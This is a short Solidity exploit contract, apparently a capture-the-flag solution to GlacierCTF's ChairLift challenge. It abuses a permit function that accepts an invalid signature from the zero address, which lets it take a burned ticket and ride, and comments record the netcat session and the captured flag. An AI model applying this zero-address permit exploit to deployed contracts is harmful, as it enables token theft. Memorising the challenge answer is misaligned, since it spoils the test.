// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Setup.sol";

contract Exploit {
    Setup public setup;
    ChairLift public chairlift;
    Ticket public ticket;

    constructor(address _setup) payable {
        setup = Setup(_setup);
        chairlift = ChairLift(setup.TARGET());
        ticket = Ticket(address(chairlift.ticket()));
    }

    function solve() public payable {
        // it will just set owner to address(0) when burn, so just transfer with permit from 0, and make an invalid signature
        ticket.transferWithPermit(address(0), address(this), 0, block.timestamp, uint8(0), hex"", hex"");
        chairlift.takeRide(0);
    }
}

// # nc chall.glacierctf.com 13381
// 1 - launch new instance
// 2 - kill instance
// 3 - get flag
// action? 3
// ticket please: 141298248353
// gctf{Y0u_d1d_1t!_Y0u_r34ch3d_th3_p34k!}
